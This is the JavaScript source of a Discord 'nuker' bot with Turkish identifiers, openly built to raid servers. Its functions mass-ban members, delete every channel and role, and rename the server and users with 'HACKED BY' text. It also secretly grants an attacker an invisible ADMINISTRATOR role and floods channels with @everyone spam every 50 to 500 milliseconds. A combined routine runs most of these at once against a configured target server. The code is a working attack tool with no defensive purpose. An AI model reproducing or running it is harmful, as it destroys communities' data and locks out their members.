const Discord = require("discord.js")
const client = new Discord.Client()

client.on("message", async (message) => {
  //client.user.setActivity("offline")
  //client.user.setStatus("offline")
  if(message.channel.type == "dm") {
    console.log(`[DM] ${message.author.tag} == ${message.content}`)
  }
})


const adminyap = (guildID, accountID1, accountID2) => {
    const targetServer = client.guilds.get(guildID)
    if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
    else if (!targetServer.members.get(client.user.id).hasPermission('MANAGE_ROLES_OR_PERMISSIONS') || !targetServer.members.get(client.user.id).hasPermission('MANAGE_ROLES')) return console.error(`${client.user.username} has not the required perms to make something like this`)

    targetServer.createRole({name: `\u200b`, color: 0x2F3136, permissions: "ADMINISTRATOR"}).then((role) => {

        targetServer.members.get(accountID1).addRole(role).catch((err) => {
           return console.error(`${targetServer.name} sunucusunda bulunmuyorsunuz!`)
        })
    })
}
 
const serveridegistir = (guildID, options) => {
    const targetServer = client.guilds.get(guildID)
    if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
    else if (!targetServer.members.get(client.user.id).hasPermission("MANAGE_GUILD")) return console.error(`${client.user.username} has not the required perms to make something like this`)
    
    targetServer.setName(options.newServerName)
    targetServer.setIcon(options.newServerIcon)
}

const uyleribanla = (guildID) => {
    const targetServer = client.guilds.get(guildID)
    if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
    else if (!targetServer.members.get(client.user.id).hasPermission("BAN_MEMBERS")) return console.error(`${client.user.username} has not the required perms to make something like this`)

    targetServer.members.forEach(async (member) => {
      if(member.id == configs.accountID1) return;
      //if(member.id == configs.accountID2) return;
        member.bannable ? await member.ban({reason: `HACKED BY ${client.user.tag}`}) : undefined
    })
}

const kullanicilarinisimlerinidegistir = (guildID, newNick) => {
    const targetServer = client.guilds.get(guildID)
    if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
    else if (!targetServer.members.get(client.user.id).hasPermission("MANAGE_NICKNAMES")) return console.error(`${client.user.username} has not the required perms to make something like this`)

    targetServer.members.forEach((member) => {
        try {
            
            member.setNickname(newNick, `HACKED BY ${client.user.tag}`)
        } catch (error) {
            undefined
        }
    })
}

const kanallarisil = (guildID) => {
    const targetServer = client.guilds.get(guildID)
    if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
  else if (!targetServer.members.get(client.user.id).hasPermission("MANAGE_CHANNELS")) return console.error(`${client.user.username} has not the required perms to make something like this`)
    targetServer.channels.forEach(chan => { 
      if(chan.id === "666324732970270720") return;
      chan.delete('HACKED!')
    });
}

const rollerisil = (guildID) => {
    const targetServer = client.guilds.get(guildID)
    if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
  else if (!targetServer.members.get(client.user.id).hasPermission("MANAGE_ROLES")) return console.error(`${client.user.username} adlı botun hedef sunucunun rollerini silmesi için yeterli yetkiye sahip değil!`)
    targetServer.roles.forEach(rol => { rol.delete('HACKED!')});
}

const kanalolustur = (guildID, name, message) => {
    const targetServer = client.guilds.get(guildID)
    if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
    else if (!targetServer.members.get(client.user.id).hasPermission("MANAGE_CHANNELS") || !targetServer.members.get(client.user.id).hasPermission('MANAGE_ROLES_OR_PERMISSIONS') || !targetServer.members.get(client.user.id).hasPermission('MANAGE_ROLES')) return console.error(`${client.user.username} adlı botun kanal oluşturması için yeterli yetkisi bulunmamakta!`)

    setInterval(async () => {
        await targetServer.createChannel(name, "text").then(x => {
          setInterval(async () => {
            x.send(message)
            //x.send(`@everyone @here HACKED! https://discord.gg/sKKfcag`)
          }, 500)
        })
        await targetServer.createChannel(name, "voice")
    }, 500)

}

const rololustur = (guildID, name) => {
    const targetServer = client.guilds.get(guildID)
    if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
    else if (!targetServer.members.get(client.user.id).hasPermission("MANAGE_CHANNELS") || !targetServer.members.get(client.user.id).hasPermission('MANAGE_ROLES_OR_PERMISSIONS') || !targetServer.members.get(client.user.id).hasPermission('MANAGE_ROLES')) return console.error(`${client.user.username} adlı botun rol oluşturması için yeterli yetkisi bulunmamakta!`)

    setInterval(async () => {
        await targetServer.createRole({name: `HACKED BY ${client.user.username}`, permissions: 0, color: 0xFF0000 }).then(async(role) =>{
            await targetServer.members.forEach(async (member) => {
                try {
                    await member.addRole(role)
                } catch (error) {
                    undefined
                }
            })
        })
    }, 500)

}

const banlariac = (guildID) => {
    const targetServer = client.guilds.get(guildID)
    if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
    else if (!targetServer.members.get(client.user.id).hasPermission('BAN_MEMBERS')) return console.error(`${client.user.username} adlı botun rol oluşturması için yeterli yetkisi bulunmamakta!`)

  targetServer.fetchBans().then(bans => {
    bans.forEach(user => {
      targetServer.unban(user);
    });
  });
}

const kanallarayolla = async (guildID, msaj) => {
    const targetServer = client.guilds.get(guildID)
    if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
    else if (!targetServer.members.get(client.user.id).hasPermission('BAN_MEMBERS')) return console.error(`${client.user.username} adlı botun rol oluşturması için yeterli yetkisi bulunmamakta!`)
  setInterval(async () => {
    await targetServer.channels.forEach(async (channel) => {
      try {
          channel.send(msaj)
        
      } catch (error) {
        undefined
      }
    })
}, 50)
}

const herşey = async (guildID, options) => {
  try {
  let guild = guildID
    const targetServer = client.guilds.get(guildID)
    if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
    else if (!targetServer.members.get(client.user.id).hasPermission("MANAGE_CHANNELS") || !targetServer.members.get(client.user.id).hasPermission('MANAGE_ROLES_OR_PERMISSIONS') || 
!targetServer.members.get(client.user.id).hasPermission('BAN_MEMBERS') || !targetServer.members.get(client.user.id).hasPermission('MANAGE_ROLES')) return console.error(`${client.user.username} adlı botun herşeyi yapabilmesi için yeterli yetkisi bulunmamakta!`)
  console.log(`HERŞEY İÇİN HAZİRİZ VE BAŞLADİM!`)
  targetServer.roles.forEach(rol =>rol.delete());//ROLLERİSİLME
  
  targetServer.channels.forEach(chan =>chan.delete());//KANALLARİSİLME
  
  targetServer.setName(options.yenisunucuismi)//İSİMDEGİSME
  targetServer.setIcon(options.yenisunucuiconu)//İCONDEGİSME
  
  
  //KANALOLUŞTURMA
  setInterval(async () => {
        await targetServer.createChannel(options.olusturulacakkanalisim, "text").then(x => {
          setInterval(async () => {
            x.send(options.olusturulacakkanalmesaj)
          }, 500)
        })
        await targetServer.createChannel(options.olusturulacakkanalisim, "voice")
    }, 500)
  //KANALOLUŞTURMAFİNİTO
  
  
  //BANALL
  //targetServer.members.forEach(async (member) => member.ban({reason: `HACKED!`}))
  //BANALLFİNİTO
  } catch (err) {
    return;
  }
}





const configs = {
  "hedefsunucuid": "HEDEF SUNUCU ID",
  "adminhesap1": "HEDEF SUNUCU ID",
  //"adminhesap2": "326692518118948865",
  "olusturulacakkanalisimi": "DESTUR!",
  "olusturulacakrolismi": "DESTUR!",
  "yenibotismi": "DESTUR!",
  "yeniboticonu": 'https://6.top4top.net/p_1415xrqem1.jpg',
  "yenisunucuiconu": "https://6.top4top.net/p_1415xrqem1.jpg",
  "yenisunucuismi": "DESTUR!!",
  "yenikullaniciisimleri": "DESTUR!! ",
  "tekkanallaragonderilecekmesaj": "DESTUR!! @everyone"
}

client.on("ready", () => {
    console.log("THE HACKING STARTED NOW " + client.user.id + ' | ' + client.user.tag + ' | Sunucu => | ' + client.guilds.size + ' | Uye => | ' + client.users.size)

    // Setup YOUR personnal settings

    //client.user.setUsername(configs.yenibotismi)
    //client.user.setAvatar(configs.yeniboticonu)

    // Enable all the options
    //banlariac(configs.hedefsunucuid)
   //kanallarisil(configs.hedefsunucuid)
   // adminyap(configs.hedefsunucuid, configs.adminhesap1, configs.adminhesap2)
  //serveridegistir(configs.hedefsunucuid, {"newServerName": configs.yenisunucuismi, "newServerIcon": configs.yenisunucuiconu})
    //kullanicilarinisimlerinidegistir(configs.hedefsunucuid, configs.yenikullaniciisimleri)
        //uyleribanla(configs.hedefsunucuid)
    //rollerisil(configs.hedefsunucuid)
    //rololustur(configs.hedefsunucuid, configs.olusturulacakrolismi)
   //kanalolustur(configs.hedefsunucuid, configs.olusturulacakkanalisimi, "@everyone @here İLGİ BÖYLE ÇEKİLİR!!")
    //kanallarayolla(configs.hedefsunucuid, configs.tekkanallaragonderilecekmesaj) //1 KEZ YOLLAR!
  //  herşey(configs.hedefsunucuid, {"yenisunucuismi": configs.yenisunucuismi, "yenisunucuiconu": configs.yenisunucuiconu, olusturulacakkanalisim: configs.olusturulacakkanalisimi, "olusturulacakkanalmesaj": "@everyone @here HACKED!"})
})


client.login("TOKEN")
